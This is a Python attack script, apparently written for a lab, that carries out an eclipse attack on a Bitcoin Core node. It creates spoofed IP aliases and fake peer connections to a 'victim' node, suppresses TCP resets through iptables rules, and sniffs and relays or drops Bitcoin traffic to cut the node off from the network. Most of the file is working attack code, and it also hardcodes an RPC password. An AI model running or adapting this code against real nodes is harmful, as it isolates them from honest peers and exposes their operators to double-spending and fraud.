from _thread import start_new_thread
from scapy.all import *
import socket
import atexit
import json
import os
import time
import bitcoin
from bitcoin.messages import *
from bitcoin.net import CAddress

import fcntl
import struct 

# Percentage (0 to 1) of packets to drop, else: relayed to victim
eclipse_packet_drop_rate = 0

num_identities = 1

victim_ip = '10.0.2.4'
victim_port = 8333

attacker_ip = '10.0.2.15'

spoof_IP_interface = [] # Keeps the IP alias interface and IP for each successful connection
spoof_IP_and_ports = [] # Keeps the IP and port for each successful connection
spoof_IP_sockets = [] # Keeps the socket for each successful connection

# The file where the iptables backup is saved, then restored when the script ends
iptables_file_path = f'{os.path.abspath(os.getcwd())}/backup.iptables.rules'

# Send commands to the Linux terminal
def terminal(cmd):
	return os.popen(cmd).read()

# Send commands to the Bitcoin Core Console
def bitcoin(cmd):
	return os.popen('./../../src/bitcoin-cli -rpcuser=cybersec -rpcpassword=kZIdeN4HjZ3fp9Lge4iezt0eJrbjSi8kuSuOHeUkEUbQVdf09JZXAAGwF3R5R2qQkPgoLloW91yTFuufo7CYxM2VPT7A5lYeTrodcLWWzMMwIrOKu7ZNiwkrKOQ95KGW8kIuL1slRVFXoFpGsXXTIA55V3iUYLckn8rj8MZHBpmdGQjLxakotkj83ZlSRx1aOJ4BFxdvDNz0WHk1i2OPgXL4nsd56Ph991eKNbXVJHtzqCXUbtDELVf4shFJXame -rpcport=8332 ' + cmd).read()

# Get the network interface of the default gateway
def get_interface():
	m = re.search(r'\n_gateway +[^ ]+ +[^ ]+ +[^ ]+ +([^ ]+)\n', terminal('arp'))
	if m != None:
		return m.group(1)
	else:
		print('Error: Network interface couldn\'t be found.')
		sys.exit()

# Get the broadcast address of the network interface
# Used as an IP template of what can change, so that packets still come back to the sender
def get_broadcast_address():
	m = re.search(r'broadcast ([^ ]+)', terminal(f'ifconfig {network_interface}'))
	if m != None:
		return m.group(1)
	else:
		print('Error: Network broadcast IP couldn\'t be found.')
		sys.exit()

# Generate a random identity using the broadcast address
def random_ip():
	#return f'10.0.{str(random.randint(0, 255))}.{str(random.randint(0, 255))}'
	ip = broadcast_address
	old_ip = ''
	while(old_ip != ip):
		old_ip = ip
		ip = ip.replace('255', str(random.randint(0, 255)), 1)
	return ip

# Create an alias for a specified identity
def ip_alias(ip_address):
	global alias_num
	print(f'Setting up IP alias {ip_address}')
	interface = f'{network_interface}:{alias_num}'
	terminal(f'sudo ifconfig {interface} {ip_address} netmask 255.255.255.0 broadcast {broadcast_address} up')
	alias_num += 1
	return interface

# Construct a version packet using python-bitcoinlib
def version_packet(src_ip, dst_ip, src_port, dst_port):
	msg = msg_version()
	msg.nVersion = bitcoin_protocolversion
	msg.addrFrom.ip = src_ip
	msg.addrFrom.port = src_port
	msg.addrTo.ip = dst_ip
	msg.addrTo.port = dst_port
	# Default is /python-bitcoinlib:0.11.0/
	msg.strSubVer = bitcoin_subversion.encode() # Look like a normal node
	return msg

# Close a connection
def close_connection(index):
	if index < 0 and index >= len(spoof_IP_sockets):
		print('Error: Failed to close connection')
		return
	ip, port = spoof_IP_and_ports[index]
	interface = spoof_IP_interface[index][0]
	socket = spoof_IP_sockets[index]

	del spoof_IP_and_ports[index]
	del spoof_IP_sockets[index]
	del spoof_IP_interface[index]

	socket.close()
	terminal(f'sudo ifconfig {interface} {ip} down')

	print(f'Successfully closed connection to ({ip} : {port})')

# Creates a fake connection to the victim
def make_fake_connection(src_ip, dst_ip, verbose=True):
	src_port = random.randint(1024, 65535)
	dst_port = victim_port
	print(f'Creating fake identity ({src_ip} : {src_port}) to connect to ({dst_ip} : {dst_port})...')

	spoof_interface = ip_alias(src_ip)
	spoof_IP_interface.append((spoof_interface, src_ip))
	if verbose: print(f'Successfully set up IP alias on interface {spoof_interface}')
	if verbose: print('Resulting ifconfig interface:')
	if verbose: print(terminal(f'ifconfig {spoof_interface}').rstrip() + '\n')

	if verbose: print('Setting up iptables configurations')
	terminal(f'sudo iptables -I OUTPUT -o {spoof_interface} -p tcp --tcp-flags ALL RST,ACK -j DROP')
	terminal(f'sudo iptables -I OUTPUT -o {spoof_interface} -p tcp --tcp-flags ALL FIN,ACK -j DROP')
	terminal(f'sudo iptables -I OUTPUT -o {spoof_interface} -p tcp --tcp-flags ALL FIN -j DROP')
	terminal(f'sudo iptables -I OUTPUT -o {spoof_interface} -p tcp --tcp-flags ALL RST -j DROP')

	if verbose: print('Creating network socket...')
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	
	if verbose: print(f'Setting socket network interface to "{network_interface}"...')
	s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, str(network_interface + '\0').encode('utf-8'))
	
	if verbose: print(f'Binding socket to ({src_ip} : {src_port})...')
	s.bind((src_ip, src_port))

	if verbose: print(f'Connecting ({src_ip} : {src_port}) to ({dst_ip} : {dst_port})...')
	s.connect((dst_ip, dst_port))

	# Send version packet
	if verbose: print('\nSending VERSION packet')
	version = version_packet(src_ip, dst_ip, src_port, dst_port)
	print(version)
	s.send(version.to_bytes())

	# Get verack packet
	if verbose: print('\nReceiving VERACK packet')
	verack = s.recv(1924)
	if verbose: print(verack) # Next message received must be <= 1924 bytes
	
	# Send verack packet
	if verbose: print('\nSending VERACK packet')
	verack = msg_verack()
	if verbose: print(verack)
	s.send(verack.to_bytes())

	# Get verack packet
	if verbose: print('\nReceiving VERACK packet')
	if verbose: print(s.recv(1024)) # Next message received must be <= 1024 bytes

	if verbose: print('\n\n')
	if verbose: print('* CONNECTION SUCCESSFULLY ESTABLISHED *')

	spoof_IP_and_ports.append((src_ip, src_port))
	spoof_IP_sockets.append(s)

	# Listen to the connections for future packets
	if verbose: print('Attaching packet listener for future messages...')
	try:
		start_new_thread(sniff, (), {
			'iface': spoof_interface,
			'prn': packet_received,
			'filter': 'tcp',
			'store': 1
		})
	except:
		print('Error: unable to  start thread to sniff interface {spoof_interface}')

# Called when a packet is sniffed from the network
def packet_received(packet):
	try:
		magic_number = packet.load[:4]
		if magic_number != b'\xf9\xbe\xb4\xd9':
			return # Only allow Bitcoin messages (by verifying the global magic number)
	except:
		return


	# Extract the message type
	msgtype = packet.load[4:4+12].split(b"\x00", 1)[0].decode()
	#packet.load[4:16].decode()
	print(len(msgtype))
	print(msgtype == 'ping')
	#msgtype = re.sub('[^A-z0-9_]+', '', msgtype) # Remove all the \0's at the end
	# Relay Bitcoin packets that aren't from the victim
	if packet[IP].src == victim_ip:
		print(f'*** Message received ** addr={packet[IP].dst} ** cmd={msgtype}')

		if msgtype == 'ping':
			payload = packet[TCP].payload
			msg = MsgSerializable.from_bytes(bytes(payload))
			print(msg)
			print(type(msg))
			# send pong

	elif packet[IP].dst == attacker_ip:
		if len(spoof_IP_sockets) > 0:
			if random.random() > eclipse_packet_drop_rate:
				rand_i = random.randint(0, len(spoof_IP_sockets) - 1)
				rand_ip = spoof_IP_and_ports[rand_i][0]
				rand_port = spoof_IP_and_ports[rand_i][1]
				rand_socket = spoof_IP_sockets[rand_i]

				print(f'*** Relaying {msgtype} from {packet[IP].src} to {rand_ip}:{rand_port}')
				#packet[IP].src = rand_ip
				#packet[IP].dst = victim_ip

				try:
					#custom = custom_packet(msgtype, rand_ip, victim_ip, rand_port, victim_port)
					#if custom is not None:
					#	rand_socket.send(custom.to_bytes())

					#ip = IP(dst = victim_ip)
					#tcp = TCP(sport=rand_port, dport=victim_port, flags='S')
					#new_packet = ip/tcp/packet[TCP].payload
					#rand_socket.send(bytes(new_packet))

					payload = packet[TCP].payload
					rand_socket.send(bytes(payload))

				except Exception as e:
					print("Closing socket because of error: " + str(e))
					close_connection(rand_i)
					time.sleep(5)
					make_fake_connection(rand_ip, victim_ip, False) # Use old IP
					#make_fake_connection(random_ip(), victim_ip)
					sys.exit() # Stop the current thread that sniffs for packets on this interface


def initialize_network_info():
	global network_interface, broadcast_address
	network_interface = get_interface().strip()
	broadcast_address = get_broadcast_address().strip()

def initialize_bitcoin_info():
	global bitcoin_subversion
	global bitcoin_protocolversion
	bitcoin_subversion = '/Satoshi:0.18.0/'
	bitcoin_protocolversion = 70015
	try:
		network_info = None #json.loads(bitcoin('getnetworkinfo'))
		if 'subversion' in network_info:
			bitcoin_subversion = network_info['subversion']
		if 'protocolversion' in network_info:
			bitcoin_protocolversion = network_info['protocolversion']
	except:
		pass

# Save a backyp of the iptable rules
def backup_iptables():
	terminal(f'iptables-save > {iptables_file_path}')

# Restore the backup of the iptable rules
def cleanup_iptables():
	if(os.path.exists(iptables_file_path)):
		print('Cleaning up iptables configuration')
		terminal(f'iptables-restore < {iptables_file_path}')
		os.remove(iptables_file_path)

# Remove all ip aliases that were created by the script
def cleanup_ipaliases():
	for interface, ip in spoof_IP_interface:
		print(f'Cleaning up IP alias {ip} on {interface}')
		terminal(f'sudo ifconfig {interface} {ip} down')

# This function is ran when the script is stopped
def on_close():
	print('Closing open sockets')
	for socket in spoof_IP_sockets:
		socket.close()
	cleanup_ipaliases()
	cleanup_iptables()
	print('Cleanup complete. Goodbye.')


# This is the first code to run
if __name__ == '__main__':
	global alias_num
	alias_num = 0 # Increments each alias

	initialize_network_info()
	initialize_bitcoin_info()

	atexit.register(on_close) # Make on_close() run when the script terminates
	cleanup_iptables() # Restore any pre-existing iptables before backing up, just in case if the computer shutdown without restoring
	backup_iptables()

	# Create the connections
	for i in range(1, num_identities + 1):
		try:
			make_fake_connection(src_ip = random_ip(), dst_ip = victim_ip)
		except ConnectionRefusedError:
			print('Connection was refused. The victim\'s node must not be running.')

	print(f'Successful connections: {len(spoof_IP_and_ports)}\n')

	# Prevent the script from terminating when the sniff function is still active
	while 1:
		time.sleep(60)